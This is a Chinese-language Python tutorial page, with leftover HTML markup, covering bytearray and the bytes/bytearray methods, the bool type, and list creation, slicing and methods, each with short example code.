bytearray对象是bytes对象的可变对应物

class bytearray([source[, encoding[, errors]]])
bytearray对象没有专属的字面值语法,它们总是通过调用构造器来创建:

创建一个空实例: bytearray()
创建一个指定长度的以零值填充的实例: bytearray(10)
通过由整数组成的可迭代对象: bytearray(range(20))
通过缓冲区协议复制现有的二进制数据: bytearray(b'Hi!')

由于bytearray对象是可变的,该对象除了bytes和bytearray操作中所描述的bytes和bytearray共有操作之外,还支持可变序列操作。

由于两个十六进制数码精确对应一个字节,因此十六进制数是描述二进制数据的常用格式。 相应地bytearray类型具有从此种格式读取数据的附加类方法:

classmethod fromhex(string)
bytearray类方法返回一个解码给定字符串的bytearray对象,字符串必须由表示每个字节的两个十六进制数码构成,其中的ASCII空白符会被忽略。

>>> bytearray.fromhex('2Ef0 F1f2  ')
bytearray(b'.\xf0\xf1\xf2')

hex()
返回一个字符串对象,该对象包含实例中每个字节的两个十六进制数字,将bytearray对象转换为对应的十六进制表示

>>> bytearray(b'\xf0\xf1\xf2').hex()
'f0f1f2'

由于bytearray对象是由整数构成的序列,类似于列表),因此对于一个bytearray对象b,b[0]将为一个整数,而b[0:1]将为一个长度为1的 bytearray对象;这与文本字符串不同,索引和切片所产生的将都是一个长度为1的字符串

bytearray对象的表示使用bytes对象字面值格式 (bytearray(b'...')),因为它通常都要比bytearray([46, 46, 46])这样的格式更好用。总是可以使用list(b)将bytearray对象转换为一个由整数构成的列表。

【 printf风格的字节串格式化 】
print(b'%(language)s has %(number)03d quote types.' % {b'language': b"Python", b"number": 2})
# b'Python has 002 quote types.'

【 bytes和bytearray操作 】
bytes和bytearray对象都支持通用序列操作。 它们不仅能与相同类型的操作数,也能与任何bytes-like object进行互操作。 由于这样的灵活性,它们可以在操作中自由地混合而不会导致错误。 但是操作结果的返回值类型可能取决于操作数的顺序。

bytes和bytearray对象的方法不接受字符串作为其参数,就像字符串的方法不接受bytes对象作为其参数一样

a = "abc"
b = a.replace("a", "f")
print(b)   # fbc

a = b"abc"
b = a.replace(b"a", b"f")
print(b)   # b'fbc'

某些bytes和bytearray操作假定使用兼容ASCII的二进制格式,因此在处理任意二进数数据时应当避免使用

使用这些基于ASCII的操作来处理未以基于ASCII的格式存储的二进制数据可能会导致数据损坏。

bytes和bytearray对象的下列方法可以用于任意二进制数据。

bytes.count(sub[, start[, end]])
bytearray.count(sub[, start[, end]])
返回子序列sub在[start, end]范围内非重叠出现的次数。 可选参数start与end会被解读为切片表示法。
要搜索的子序列可以是任意bytes-like object或是0至255范围内的整数。

bytes.decode(encoding="utf-8", errors="strict")
bytearray.decode(encoding="utf-8", errors="strict")
返回从给定bytes解码出来的字符串。 默认编码为'utf-8'。 可以给出errors来设置不同的错误处理方案。 errors的默认值为'strict',表示编码错误会引发 UnicodeError,其他可用的值为'ignore', 'replace'以及任何其他通过codecs.register_error()注册的名称
将encoding参数传给str允许直接解码任何bytes-like object,无须创建临时的bytes或bytearray对象

bytes.endswith(suffix[, start[, end]])
bytearray.endswith(suffix[, start[, end]])
如果二进制数据以指定的suffix结束则返回True,否则False。suffix也可以为由多个供查找的后缀构成的元组。如果有可选项start将从所指定位置开始检查,如果有可选项end将在所指定位置停止比较。
要搜索的后缀可以是任意bytes-like object。

bytes.find(sub[, start[, end]])
bytearray.find(sub[, start[, end]])
返回子序列sub在数据中被找到的最小索引,sub包含于切片s[start:end]之内。 可选参数start与end会被解读为切片表示法。 如果sub未被找到则返回-1
要搜索的子序列可以是任意bytes-like object或是0至255范围内的整数。
find()方法应该只在需要知道sub所在位置时使用,要检查sub是否为子串请使用in操作符

bytes.index(sub[, start[, end]])
bytearray.index(sub[, start[, end]])
类似于find(),但在找不到子序列时会引发ValueError。
要搜索的子序列可以是任意 bytes-like object或是0至255范围内的整数。

bytes.join(iterable)
bytearray.join(iterable)
返回一个由iterable中的二进制数据序列拼接而成的bytes或bytearray对象。 如果iterable中存在任何非字节类对象 包括存在str对象值则会引发TypeError。 提供该方法的bytes或bytearray对象的内容将作为元素之间的分隔。

static bytes.maketrans(from, to)
static bytearray.maketrans(from, to)
此静态方法返回一个可用于bytes.translate()的转换对照表,它将把from中的每个字符映射为to中相同位置上的字符;from与to必须都是字节类对象并且具有相同的长度。

bytes.partition(sep)
bytearray.partition(sep)
在sep首次出现的位置拆分序列,返回一个3元组,其中包含分隔符之前的部分、分隔符本身或其bytearray副本,以及分隔符之后的部分。 如果分隔符未找到,则返回的3元组中包含原序列以及两个空的bytes或bytearray对象。
要搜索的分隔符可以是任意 bytes-like object。

bytes.replace(old, new[, count])
bytearray.replace(old, new[, count])
返回序列的副本,其中出现的所有子序列old都将被替换为new。 如果给出了可选参数count则只替换前count次出现。
要搜索的子序列及其替换序列可以是任意 bytes-like object。
此方法的bytearray版本并非原地操作 —— 它总是产生一个新对象,即便没有做任何改变。

bytes.rfind(sub[, start[, end]])
bytearray.rfind(sub[, start[, end]])
返回子序列sub在序列内被找到的最大(最右)索引,这样sub将包含在s[start:end]当中。 可选参数start与end会被解读为切片表示法。未找到则返回-1。
要搜索的子序列可以是任意bytes-like object或是0至255范围内的整数,也接受0至255范围内的整数作为子序列。

bytes.rindex(sub[, start[, end]])
bytearray.rindex(sub[, start[, end]])
类似于rfind(),但在子序列sub未找到时会引发ValueError。
要搜索的子序列可以是任意bytes-like object或是0至255范围内的整数,也接受0至255范围内的整数作为子序列。

bytes.rpartition(sep)
bytearray.rpartition(sep)
在sep最后一次出现的位置拆分序列,返回一个3元组,其中包含分隔符之前的部分,分隔符本身或其bytearray副本,以及分隔符之后的部分。 如果分隔符未找到,则返回的3元组中包含两个空的bytes或bytearray对象以及原序列的副本。
要搜索的分隔符可以是任意bytes-like object。

bytes.startswith(prefix[, start[, end]])
bytearray.startswith(prefix[, start[, end]])
如果二进制数据以指定的prefix开头则返回True,否则False。 prefix也可以为由多个供查找的前缀构成的元组。 如果有可选项start,将从所指定位置开始检查。 如果有可选项end将在所指定位置停止比较。
要搜索的前缀可以是任意bytes-like object。

bytes.translate(table, delete=b'')
bytearray.translate(table, delete=b'')
返回原bytes或bytearray对象的副本,移除其中所有在可选参数delete中出现的bytes,其余bytes将通过给定的转换表进行映射,该转换表必须是长度为256的bytes对象
可以使用bytes.maketrans()方法来创建转换表。
对于仅需移除字符的转换,请将table参数设为None:

>>> b'read this short text'.translate(None, b'aeiou')
b'rd ths shrt txt'

以下bytes和bytearray对象的方法的默认行为会假定使用兼容ASCII的二进制格式,但通过传入适当的参数仍然可用于任意二进制数据。
以下所有的bytearray方法都不是原地执行操作,而是会产生新的对象,即便没有做任何改变

bytes.center(width[, fillbyte])
bytearray.center(width[, fillbyte])
返回原对象的副本,在长度为width的序列内居中,使用指定的fillbyte填充两边的空位(默认使用ASCII空格符)。 对于bytes对象,如果width小于等于len(s)则返回原序列的副本。

bytes.ljust(width[, fillbyte])
bytearray.ljust(width[, fillbyte])
反回原对象的副本,在长度为width的序列中靠左对齐。使用指定的fillbyte填充空位(默认使用ASCII空格符)。 对于bytes对象,如果width小于等于len(s)则返回原序列的副本。

bytes.lstrip([chars])
bytearray.lstrip([chars])
返回原序列的副本,移除指定的前导字节。chars参数为指定要移除字节值集合的二进制序列 —— 这个名称表明此方法通常是用于ASCII字符。 如果省略或为None,则chars参数默认移除ASCII空白符。chars参数并非指定单个前缀;而是会移除参数值的所有组合:
要移除的字节值二进制序列可以是任意bytes-like object

>>> b'   spacious   '.lstrip()
b'spacious   '
>>> b'www.example.com'.lstrip(b'cmowz.')
b'example.com'

bytes.rjust(width[, fillbyte])
bytearray.rjust(width[, fillbyte])
返回原对象的副本,在长度为width的序列中靠右对齐。使用指定的fillbyte填充空位(默认使用ASCII空格符)。 对于bytes对象,如果width小于等于len(s)则返回原序列的副本。

bytes.rsplit(sep=None, maxsplit=-1)
bytearray.rsplit(sep=None, maxsplit=-1)
将二进制序列拆分为相同类型的子序列,使用sep作为分隔符。如果给出了maxsplit则最多进行maxsplit次拆分,从最右边开始。 如果sep未指定或为None,任何只包含ASCII空白符的子序列都会被作为分隔符。 除了从右边开始拆分,rsplit()的其他行为都类似于下文所述的split()。

bytes.rstrip([chars])
bytearray.rstrip([chars])
返回原序列的副本,移除指定的末尾字节。chars参数为指定要移除字节值集合的二进制序列 —— 这个名称表明此方法通常是用于ASCII字符。 如果省略或为None,则chars参数默认移除ASCII空白符。chars参数并非指定单个后缀;而是会移除参数值的所有组合:
要移除的字节值二进制序列可以是任意 bytes-like object。

>>> b'   spacious   '.rstrip()
b'   spacious'
>>> b'mississippi'.rstrip(b'ipz')
b'mississ'

bytes.split(sep=None, maxsplit=-1)
bytearray.split(sep=None, maxsplit=-1)
将二进制序列拆分为相同类型的子序列,使用sep作为分隔符。如果给出了maxsplit且非负值则最多进行maxsplit次拆分(因此列表最多会有maxsplit+1个元素)。如果maxsplit未指定或为-1则不限制拆分次数即进行所有可能的拆分
如果给出了sep则连续的分隔符不会被组合在一起而是被视为分隔空子序列 (例如 b'1,,2'.split(b',') 将返回 [b'1', b'', b'2'])。 sep 参数可能为一个多字节序列 (例如b'1<>2<>3'.split(b'<>') 将返回 [b'1', b'2', b'3'])。 使用指定的分隔符拆分空序列将返回 [b''] 或 [bytearray(b'')],具体取决于被拆分对象的类型。 sep 参数可以是任意 bytes-like object。

>>> b'1,2,3'.split(b',')
[b'1', b'2', b'3']
>>> b'1,2,3'.split(b',', maxsplit=1)
[b'1', b'2,3']
>>> b'1,2,,3,'.split(b',')
[b'1', b'2', b'', b'3', b'']

如果sep未指定或为None则会应用另一种拆分算法:连续的ASCII空白符会被视为单个分隔符,其结果将不包含序列开头或末尾的空白符。 因此在不指定分隔符的情况下对空序列或仅包含ASCII空白符的序列进行拆分将返回 []。

>>> b'1 2 3'.split()
[b'1', b'2', b'3']
>>> b'1 2 3'.split(maxsplit=1)
[b'1', b'2 3']
>>> b'   1   2   3   '.split()
[b'1', b'2', b'3']
bytes.strip([chars])
bytearray.strip([chars])

返回原序列的副本,移除指定的开头和末尾字节。chars参数为指定要移除字节值集合的二进制序列 —— 这个名称表明此方法通常是用于ASCII字符。 如果省略或为None则chars参数默认移除ASCII空白符。 chars参数并非指定单个前缀或后缀;而是会移除参数值的所有组合:
要移除的字节值二进制序列可以是任意 bytes-like object。

>>> b'   spacious   '.strip()
b'spacious'
>>> b'www.example.com'.strip(b'cmowz.')
b'example'

以下bytes和bytearray对象的方法会假定使用兼容ASCII的二进制格式,不应当被应用于任意二进制数据,以下所有的bytearray方法都不是原地执行操作,而是会产生新的对象。
小写ASCII字符就是字节值包含在序列b'abcdefghijklmnopqrstuvwxyz'中的字符。 大写ASCII字符就是字节值包含在序列b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'中的字符。

bytes.capitalize()
bytearray.capitalize()
返回原序列的副本,其中每个字节将都将被解读为一个ASCII字符,并且第一个字节的字符大写而其余的小写。 非ASCII字节值将保持原样不变。

bytes.expandtabs(tabsize=8)
bytearray.expandtabs(tabsize=8)
返回序列的副本,其中所有的 ASCII 制表符会由一个或多个 ASCII 空格替换,具体取决于当前列位置和给定的制表符宽度。 每 tabsize 个字节设为一个制表位(默认值 8 时设定的制表位在列 0, 8, 16 依次类推)。 要展开序列,当前列位置将被设为零并逐一检查序列中的每个字节。 如果字节为 ASCII 制表符 (b'\t'),则并在结果中插入一个或多个空格符,直到当前列等于下一个制表位。 (制表符本身不会被复制。) 如果当前字节为 ASCII 换行符 (b'\n') 或回车符 (b'\r'),它会被复制并将当前列重设为零。 任何其他字节会被不加修改地复制并将当前列加一,不论该字节值在被打印时会如何显示:

>>>
>>> b'01\t012\t0123\t01234'.expandtabs()
b'01      012     0123    01234'
>>> b'01\t012\t0123\t01234'.expandtabs(4)
b'01  012 0123    01234'

bytes.isalnum()
bytearray.isalnum()
如果序列中所有字节都是字母类ASCII字符或ASCII十进制数码并且序列非空则返回真值,否则返回假值。 字母类ASCII字符就是字节值包含在序列 b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'中的字符。 ASCII十进制数码就是字节值包含在序列b'0123456789'中的字符。

>>> b'ABCabc1'.isalnum()
True
>>> b'ABC abc1'.isalnum()
False
bytes.isalpha()
bytearray.isalpha()

如果序列中所有字节都是字母类ASCII字符并且序列非空则返回真值,否则返回假值

>>> b'ABCabc'.isalpha()
True
>>> b'ABCabc1'.isalpha()
False

bytes.isascii()
bytearray.isascii()
如果序列为空或序列中所有字节都是ASCII字节则返回真值,否则返回假值。 ASCII字节的取值范围是0-0x7F

bytes.isdigit()
bytearray.isdigit()
如果序列中所有字节都是 ASCII 十进制数码并且序列非空则返回真值,否则返回假值。 ASCII 十进制数码就是字节值包含在序列 b'0123456789' 中的字符。

>>> b'1234'.isdigit()
True
>>> b'1.23'.isdigit()
False
bytes.islower()
bytearray.islower()

如果序列中至少有一个小写ASCII字符并且没有大写ASCII字符则返回真值,否则返回假值。

>>> b'hello world'.islower()
True
>>> b'Hello world'.islower()
False

bytes.isspace()
bytearray.isspace()
如果序列中所有字节都是ASCII空白符并且序列非空则返回真值,否则返回假值。 ASCII空白符就是字节值包含在序列b' \t\n\r\x0b\f' (空格, 制表, 换行, 回车, 垂直制表, 换页)中的字符。

bytes.istitle()
bytearray.istitle()
如果序列为ASCII标题形式并且序列非空则返回真值,否则返回假值

>>> b'Hello World'.istitle()
True
>>> b'Hello world'.istitle()
False

bytes.isupper()
bytearray.isupper()
如果序列中至少有一个大写字母ASCII字符并且没有小写ASCII字符则返回真值,否则返回假值。

>>> b'HELLO WORLD'.isupper()
True
>>> b'Hello world'.isupper()
False

bytes.lower()
bytearray.lower()
返回原序列的副本,其所有大写ASCII字符均转换为对应的小写形式。

>>> b'Hello World'.lower()
b'hello world'

bytes.splitlines(keepends=False)
bytearray.splitlines(keepends=False)
返回由原二进制序列中各行组成的列表,在ASCII行边界符的位置拆分。 此方法使用universal newlines方式来分行。 结果列表中不包含换行符,除非给出了keepends且为真值。

>>> b'ab c\n\nde fg\rkl\r\n'.splitlines()
[b'ab c', b'', b'de fg', b'kl']
>>> b'ab c\n\nde fg\rkl\r\n'.splitlines(keepends=True)
[b'ab c\n', b'\n', b'de fg\r', b'kl\r\n']

不同于split(),当给出了分隔符sep时对于空字符串此方法将返回一个空列表,而末尾的换行不会令结果中增加额外的行:

>>> b"".split(b'\n'), b"Two lines\n".split(b'\n')
([b''], [b'Two lines', b''])
>>> b"".splitlines(), b"One line\n".splitlines()
([], [b'One line'])
bytes.swapcase()
bytearray.swapcase()

返回原序列的副本,其所有小写ASCII字符均转换为对应的大写形式,反之亦反。

>>> b'Hello World'.swapcase()
b'hELLO wORLD'

不同于str.swapcase(),在些二进制版本下bin.swapcase().swapcase() == bin总是成立。 大小写转换在ASCII中是对称的,即使其对于任意Unicode码位来说并不总是成立。

bytes.title()
bytearray.title()
返回原二进制序列的标题版本,其中每个单词以一个大写 ASCII 字符为开头,其余字母为小写。 不区别大小写的字节值将保持原样不变。
小写ASCII字符就是字节值包含在序列b'abcdefghijklmnopqrstuvwxyz'中的字符。 大写ASCII字符就是字节值包含在序列b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'中的字符。所有其他字节值都不区分大小写。

>>> b'Hello world'.title()
b'Hello World'

该算法使用一种简单的与语言无关的定义,将连续的字母组合视为单词。 该定义在多数情况下都很有效,但它也意味着代表缩写形式与所有格的撇号也会成为单词边界,这可能导致不希望的结果:
>>> b"they're bill's friends from the UK".title()
b"They'Re Bill'S Friends From The Uk"

可以使用正则表达式来构建针对撇号的特别处理:
>>> import re
>>> def titlecase(s):
...     return re.sub(rb"[A-Za-z]+('[A-Za-z]+)?",
...                   lambda mo: mo.group(0)[0:1].upper() +
...                              mo.group(0)[1:].lower(),
...                   s)
...
>>> titlecase(b"they're bill's friends.")
b"They're Bill's Friends."

bytes.upper()
bytearray.upper()
返回原序列的副本,其所有小写ASCII字符均转换为对应的大写形式。

>>> b'Hello World'.upper()
b'HELLO WORLD'

bytes.zfill(width)
bytearray.zfill(width)
返回原序列的副本,在左边填充b'0'数码使序列长度为width。 正负值前缀(b'+'/ b'-')的处理方式是在正负符号之后填充而非在之前。 对于bytes对象,如果width小于等于len(seq)则返回原序列。

>>> b"42".zfill(5)
b'00042'
>>> b"-42".zfill(5)
b'-0042'

</pre>
</div>

<div id="bool">
<h4>bool布尔类型</h4><pre>
Python提供了bool类型来表示真True或假False,一个布尔值只有True、False两种值,要么是True,要么是False

print(type(True))    # < class 'bool'>
print(type(False))   # < class 'bool'>
print(3 > 2)         # True
print(3 > 5)         # False

布尔类型可以当做整数来对待,即True相当于整数值1,False相当于整数值0,在实际应用中不要这么用
print(False+1)  # 1
print(True+1)   # 2

布尔值可以用and、or和not运算
and运算是与运算,只有所有都为True,and运算结果才是True,如5 > 3 and 3 > 1
or运算是或运算,只要其中有一个为True,or运算结果就是True
not运算是非运算,它是一个单目运算符,把True变成False,False变成True,如not 1 > 2

</pre>
</div>

<div id="list">
<h4>Python列表List</h4><pre>
list是Python内置的一种数据类型,是Python中使用最频繁的数据类型,是python最通用的复合数据类型,list是一种可变的有序的集合,可以随时添加和删除其中的元素
列表可以存储数值、字符串、列表、元组等任何类型的数据,在同一个列表中元素的类型也可以不同,但通常列表中只放入同一类型的数据提高程序的可读性,列表可以完成大多数集合类的数据结构实现

list用[ ]标识,可以作为一个方括号内的逗号分隔值出现

</pre>列表也支持索引和切片<textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-

list = [ 'runoob', 786 , 2.23, 'john', 70.2 ]
tinylist = [123, 'john']

print(type(list))        # < class 'list'>
print(list)              # 输出完整列表
print(len(list))         # 获得list元素的个数
print(list[0])           # 输出列表的第一个元素
print(list[1:3])         # 输出第二个至第三个元素,输出[786, 2.23]
print(list[:3])          # print(list[0:3])的简写
print(list[2:])          # 输出从第三个开始至列表末尾的所有元素
print(list[len(list)-1]) # 获取最后一个元素
print(list[-1])          # 获取最后一个元素

print(tinylist * 2)      # 输出列表两次,[123, 'john', 123, 'john']
print(list + tinylist)   # 打印组合的列表,['runoob', 786, 2.23, 'john', 70.2, 123, 'john']

print(3 in list)                # false
for x in [1, 2, 3]: print(x),   # 1 2 3,去掉最后的逗号则每行输出一个数字

# del语句不常用,因为Python自带的垃圾回收机制会自动销毁不用的列表,所以即使开发者不手动将其删除,Python也会自动将其回收
del list                 # 删除列表

</textarea>list元素也可以是另一个list,可以看成是一个二维数组,类似的还有三维、四维<textarea>
s = ['python', 'java', ['asp', 'php'], 'scheme']
print(len(s))     # 4
print(s[2][1])    # php

p = ['asp', 'php']
s = ['python', 'java', p, 'scheme']

</textarea>与immutable的字符串不同,列表是mutable类型即内容可以改变,可以给切片赋值,甚至可以改变列表大小或把列表整个清空<textarea>
list0 = []               # 空列表
list0.append('html')     # 使用append()添加元素
list0.append('js')
list0.insert(1, 'css')   # 把元素插入到指定的位置
print(list0)             # ['html', 'css', 'js']

list0.append(['DOM', 'BOM']) # 给append()方法传递列表或者元组,此方法也只会将其视为一个元素,直接添加到列表中,从而形成包含列表和元组的新列表
print(list0)                 # ['html', 'css', 'js', ['DOM', 'BOM']]

list0[0] = 'html+css+js'     # 要把某个元素替换成别的元素,可以直接赋值给对应的索引位置
print(list0)                 # ['html+css+js', 'css', 'js', ['DOM', 'BOM']]

list0[1:4] = ['nodejs', 'python']
print(list0)                 # ['html+css+js', 'nodejs', 'python']

list0[1:3] = []
print(list0)                 # ['html+css+js']

list0[:] = []
print(list0)                 # []

list0 = ['Google', 'Yahoo', 'Baidu']
del list0[1]                 # 使用del语句来删除列表的元素
print(list0)                 # ['Google', 'Baidu']
list0.pop()                  # 删除list0末尾的元素
print(list0)                 # ['Google']
list0.pop(0)                 # 删除list0指定位置的元素
print(list0)                 # []

</textarea>Python还提供了一个内置的list()函数来创建列表,它可用于将元组、区间(range)等对象转换为列表<textarea>
a_tuple = ('crazyit', 20, -1.2)
a_list = list(a_tuple)   # 将元组转换成列表
print(a_list)

a_range = range(1, 5)    # 使用range()函数创建区间(range)对象
list1 = list(a_range)   # 将区间转换成列表
print(list1)

</textarea>列表解析赋值<textarea>
testList= [1,2,3]
x,y,z= testList
print(x,y,z) # 1 2 3

</textarea>切片操作<textarea>
L = list(range(100))    # 创建0-99的列表
print(L[:10])           # 前10
print(L[-10:])          # 后10
print(L[10:20])         # 前11-20
print(L[:10:2])         # [0, 2, 4, 6, 8],第三个参数表示截取的步长,L[:10:2]表示前10个数字中每隔2个数取1个
print(L[::5])           # 所有数字,每5个取1个
print(L[:])             # 直接复制

</textarea>检验一个列表中的所有元素是否都一样<textarea>
def all_equal(lst):
 return lst[1:] == lst[:-1]

all_equal([1, 2, 3, 4, 5, 6]) # False
all_equal([1, 1, 1, 1]) # True

</textarea>将列表内的所有元素包括子列表都展开成一个列表<textarea>
def spread(arg):
    ret = []
    for i in arg:
        if isinstance(i, list):
            ret.extend(i)
        else:
            ret.append(i)
    return ret
spread([1,2,3,[4,5,6],[7],8,9]) # [1,2,3,4,5,6,7,8,9]

# 使用yield和yieldfrom实现生成器把多层嵌套的列表展平
def flat(deep_list):
    for element in deep_list:
        if isinstance(element, list):
            yield from flat(element)
        else:
            yield element

a = [1, 2, [3, 4, [5, 6, 7], 8], 9, [10, 11]]
result = [x for x in flat(a)]   # 对生成器进行迭代
print(result)

# 将大列表拆分为小列表
a = [1,2,3,4,5,6,7,8,9,0]
n = 3
c= [a[i:i+n] for i in range(0, len(a), n)]

# 将大列表套小列表转化为一个列表
a = [[1], [2], [3]]
b = []
[b.extend(li) for li in a]
print(b) # [1, 2, 3]

# 一次性的整合列表
def flatten(lst):
    return [x for y in lst for x in y]

flatten([[1,2,3,4],[5,6,7,8]]) # [1, 2, 3, 4, 5, 6, 7, 8]

# 将列表值分组
def bifurcate(lst, filter):
    return [
        [x for i,x in enumerate(lst) if filter[i] == True],
        [x for i,x in enumerate(lst) if filter[i] == False]
    ]

bifurcate(['beep', 'boop', 'foo', 'bar'], [True, True, False, True])
# [ ['beep', 'boop', 'bar'], ['foo'] ]

# 列表降维
oldlist = [[1, 2, 3], [4, 5]]
# 想得到结果：
newlist = [1, 2, 3, 4, 5]
newlist = oldlist[0] + oldlist[1]  # 方法一粗暴拼接法,如果原列表有很多子列表则这个方法就会变得繁琐了
newlist = [i for j in range(len(oldlist)) for i in oldlist[j]]  # 方法二列表推导式
newlist = sum(oldlist,[])  # 方法三巧用sum,执行效果是oldlist中的子列表逐一与第二个参数相加,而列表的加法相当于extend操作,所以最终结果是由[]扩充成的列表

</textarea>返回两个iterables间的差异<textarea>
def difference(a, b):
    return [item for item in a if item not in set(b)]

difference([1, 2, 3], [1, 2, 4]) # [3]

</textarea>列表合并去重<textarea>
list1 = [2,3,8,4,9,5,6]
list2 = [5,6,10,17,11,2]
list3 = list1 + list2
print(list3)             # [2, 3, 8, 4, 9, 5, 6, 5, 6, 10, 17, 11, 2]
print(list(set(list3)))  # [2, 3, 4, 5, 6, 8, 9, 10, 11, 17]

</textarea><pre>
【 Python列表函数&方法 】
1、Python包含以下函数:
cmp(list1, list2)
比较两个列表的元素

len(list)
列表元素个数

max(list)
返回列表元素最大值

min(list)
返回列表元素最小值

list(seq)
将元组转换为列表

2、Python包含以下方法:
print([e for e in dir(list) if not e.startswith('_')])
# ['append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']
insert、remove或sort方法只修改列表,没有打印出返回值,它们返回默认值None,这是Python中所有可变数据结构的设计原则

list.append(obj)
在列表末尾添加新的对象

list.count(obj)
统计某个元素在列表中出现的次数,可用来判断列表中是否存在等于该值的元素

</pre><textarea>
a_list = [2, 30, 'a', [5, 30], 30]
# 计算列表中30的出现次数
print(a_list.count(30))        # 2
# 计算列表中[5, 30]的出现次数
print(a_list.count([5, 30]))   # 1

# 找到列表中出现最频繁的数
test= [1,2,3,4,2,2,3,1,4,4,4]
print(max(set(test), key=test.count))  # 4

</textarea><pre>
list.copy()
返回列表的一个浅拷贝,相当于a[:]

list.extend(seq)
在列表末尾一次性追加另一个序列中的多个值(用新列表扩展原来的列表),相当于a[len(a):] = iterable

</pre><textarea>
list1 = ['a', 30]
# 追加元组中的所有元素
list1.extend((-2, 3.1))
print(list1)           # ['a', 30, -2, 3.1]
# 追加列表中的所有元素
list1.extend(['C', 'R', 'A'])
print(list1)           # ['a', 30, -2, 3.1, 'C', 'R', 'A']
# 追加区间中的所有元素
list1.extend(range(97, 100))
print(list1)           # ['a', 30, -2, 3.1, 'C', 'R', 'A', 97, 98, 99]

</textarea><pre>
list.index(obj,start,end)
从列表中找出某个值第一个匹配项的索引位置,如果该元素没有出现则会引发ValueError错误
同count()方法不同,index()方法还可传入start、end参数,用于在列表的指定范围内搜索元素,返回的索引是相对于整个序列的开始计算的,而不是start参数

</pre><textarea>
a_list = [2, 30, 'a', 'b', 'crazyit', 30]
# 定位元素30的出现位置
print(a_list.index(30))             # 1
# 从索引2处开始、定位元素30的出现位置
print(a_list.index(30, 2))          # 5
# 从索引2处到索引4处之间定位元素30的出现位置,因为找不到该元素,会引发 ValueError 错误
print(a_list.index(30, 2, 4))       # ValueError: 30 is not in list

</textarea><pre>
list.insert(index, obj)
将对象插入列表,index参数指的是将元素插入到列表中指定位置处的索引值,a.insert(0, x)插入列表头部,a.insert(len(a), x)等同于a.append(x)

</pre><textarea>
list1 = list(range(1, 6))
print(list1)    # [1, 2, 3, 4, 5]
# 在索引3处插入字符串
list1.insert(3, 'CRAZY' )
print(list1)    # [1, 2, 3, 'CRAZY', 4, 5]
# 在索引3处插入列表
list1.insert(3, ["crazy"])
print(list1)    # [1, 2, 3, ['crazy'], 'CRAZY', 4, 5]

</textarea><pre>
list.pop([index=-1])
移除列表中指定索引处的元素(默认最后一个元素),并返回该元素的值
使用pop()方法可以实现一种常见的数据结构——栈。栈是一种特殊的数据结构,它可实现先入后出(FILO)功能,即先加入栈的元素反而后出栈

</pre><textarea>
a_list=[1,2,3]
#移除列表的元素 3
print(a_list.pop())    # 3
print(a_list)          # [1,2]
#移除列表中索引为 0 的元素1
print(a_list.pop(0))   # 1
print(a_list)          # 2

stack = []
# 向栈中"入栈"3个元素
stack.append("fkit")
stack.append("crazyit")
stack.append("Charlie")
print(stack)          # ['fkit', 'crazyit', 'Charlie']
# 第一次出栈:最后入栈的元素被移出栈
print(stack.pop())    # Charlie
print(stack)          # ['fkit', 'crazyit']
# 再次出栈
print(stack.pop())    # crazyit
print(stack)          # ['fkit']

</textarea><pre>
list.reverse()
反向列表中元素

</pre><textarea>
a_list = list(range(1, 8))
# 将a_list列表元素反转
a_list.reverse()
print(a_list)     # [7, 6, 5, 4, 3, 2, 1]

</textarea><pre>
list.sort(key=None, reverse=False)
对原列表进行排序,直接修改原列表并返回None以避免混淆
key参数用于指定从每个元素中提取一个用于比较的键,如key=str.lower表示在排序时不区分字母大小写。
reverse参数用于设置是否需要反转排序,默认False表示从小到大排序,True表示将会改为从大到小排序

sort()对列表进行排序时对中文支持不好,其排序结果与常用的音序排序法或者笔画排序法都不一致,如果需要实现对中文内容的列表排序,还需要重新编写相应的方法进行处理,而不能直接使用sort()

</pre><textarea>
a = [3, 4, -2, -30, 14, 9.3, 3.4]
a.sort()
print(a)   # [-30, -2, 3, 3.4, 4, 9.3, 14]

b = ['Python', 'Swift', 'Ruby', 'Go', 'Kotlin', 'Erlang']
# 默认按字符串包含的字符的编码大小比较
b.sort()
print(b)   # ['Erlang', 'Go', 'Kotlin', 'Python', 'Ruby', 'Swift']

a = [(1, 2), (4, 1), (9, 10), (13, -3)]
a.sort(key=lambda x: x[1])
print(a)   # [(13, -3), (4, 1), (1, 2), (9, 10)]

b = ['Python', 'Swift', 'Ruby', 'Go', 'Kotlin', 'Erlang']
# 指定key为len,指定使用len函数对集合元素生成比较的键,也就是按字符串的长度比较大小
b.sort(key=len)
print(b)   # ['Go', 'Ruby', 'Swift', 'Python', 'Kotlin', 'Erlang']
# 指定反向排序
b.sort(key=len, reverse=True)
print(b)   # ['Python', 'Kotlin', 'Erlang', 'Swift', 'Ruby', 'Go']

# 列表并行排序
data = zip(list1, list2)
data = sorted(data)
list1, list2 = map(lambda t: list(t), zip(*data))

</textarea><pre>
【 在列表中删除元素主要分为以下3种应用场景 】
1、根据目标元素所在位置的索引值进行删除,可使用del语句
删除列表中指定元素,和删除列表类似,也可以使用del语句实现。
del语句是Python中专门用于执行删除操作的语句,不仅可用于删除列表的元素,也可用于删除变量等

</pre><textarea>
list1 = ['crazyit', 20, -2.4, 'fkit', 'test', (3, 4)]
del list1[-1]
print(list1)       # ['crazyit', 20, -2.4, 'fkit', 'test']
# del语句还可以直接删除列表的中间一段,删除第2个到第4个(不包含)元素
del list1[1: 3]
print(list1)       # ['crazyit', 'fkit', 'test']

</textarea><pre>
2、根据元素的值进行删除,可使用列表(list类型)提供的remove()方法
remove()方法会删除第一个和指定值相同的元素,如果找不到该元素将会引发ValueError错误
在使用remove()方法删除列表元素之前,最好提前判断一下指定的元素是否存在,所以此方法常与count()方法组合使用

</pre><textarea>
list1 = [20, 'crazyit', 30, -4, 'crazyit', 3.4]
# 删除第一次找到的30
list1.remove(30)
print(list1)        # [20, 'crazyit', -4, 'crazyit', 3.4]
# 删除第一次找到的'crazyit'
list1.remove('crazyit')
print(list1)        # [20, -4, 'crazyit', 3.4]
#再次尝试删除 30,会引发 ValueEroor 错误
list1.remove(30)    # ValueError: list.remove(x): x not in list

</textarea><pre>
3、将列表中所有元素全部删除,可使用列表(list类型)提供的clear()方法,相当于del a[:]

</pre><textarea>
list1 = [20, 'crazyit', 30, -4, 'crazyit', 3.4]
list1.clear()
print(list1)    # []

